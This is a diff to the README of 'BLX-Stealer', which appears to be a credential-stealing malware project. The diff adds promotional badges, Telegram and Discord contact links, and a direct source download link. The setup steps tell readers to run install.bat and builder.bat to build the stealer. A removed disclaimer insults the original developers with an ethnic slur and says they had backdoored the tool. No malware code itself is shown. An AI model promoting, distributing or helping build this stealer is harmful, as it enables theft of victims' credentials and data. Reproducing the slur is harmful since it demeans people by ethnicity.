@@ -4,11 +4,27 @@
   </div>
     <br>
   </div>
+
+</p>
+<p align="center">
+    <img src="https://img.shields.io/github/stars/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/forks/blxstealer/BLX-Stealer?color=%23000000"> 
+    <br>
+    <img src="https://img.shields.io/github/languages/top/blxstealer/BLX-Stealer?color=%23000000">
+    <img src="https://img.shields.io/github/last-commit/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
+    <br>
+    <img src="https://img.shields.io/github/issues/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues-closed/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
+    <br>
+</p>
+ 
+<p align="center">
+  Telegram: https://t.me/blxstealer
+  Discord: https://discord.com/invite/uTsr3VPcVa  
+<br>
+
 </p>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-### Disclamer. this project was developed by two turkish monkeys who dual hooked the cunt. i have removed it and given proof in the proof folder.
-
 
 ## UPDATED
 
@@ -78,7 +94,7 @@
 
 ### Setup
 
-1. Download this github.
+1. [Download source code zip](https://github.com/blxstealer/BLX-Stealer/archive/refs/heads/main.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.bat` file
